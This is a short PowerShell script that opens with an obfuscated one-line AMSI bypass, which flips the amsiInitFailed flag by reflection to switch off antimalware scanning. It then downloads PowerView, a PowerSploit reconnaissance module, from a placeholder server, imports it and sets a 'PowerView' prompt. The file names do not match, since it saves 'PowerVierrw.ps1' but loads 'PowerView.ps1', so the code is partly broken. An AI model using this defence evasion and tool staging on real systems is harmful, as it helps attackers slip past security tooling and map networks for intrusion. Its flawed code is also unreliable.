[ReF]."`A$(echo sse)`mB$(echo L)`Y"."g`E$(echo tty)p`E"(( "Sy{3}ana{1}ut{4}ti{2}{0}ils" -f'iUt','gement.A',"on.Am`s",'stem.M','oma') )."$(echo ge)`Tf`i$(echo El)D"(("{0}{2}ni{1}iled" -f'am','tFa',"`siI"),("{2}ubl{0}`,{1}{0}" -f 'ic','Stat','NonP'))."$(echo Se)t`Va$(echo LUE)"($(),$(1 -eq 1))

$dirUrl = "http://your.url.here:8080/PowerSploit/Recon/"
$destFolder = "where\you\want\to\save\files\to\PowerSploit\Recon"

if (!(Test-Path -Path $destFolder)) {
    New-Item -ItemType Directory -Path $destFolder | Out-Null
}

Try{
    $pvUrl = $dirUrl + "PowerView.ps1"
    $localFilePath = $destFolder + "PowerVierrw.ps1"
    Invoke-WebRequest -Uri $pvUrl -OutFile $localFilePath
} Catch {}

$pvPath = $destFolder + "\PowerView.ps1"
Import-Module $pvPath -Verbose

function prompt{
    $currPath = Get-Location
    "PowerView $currPath> "
}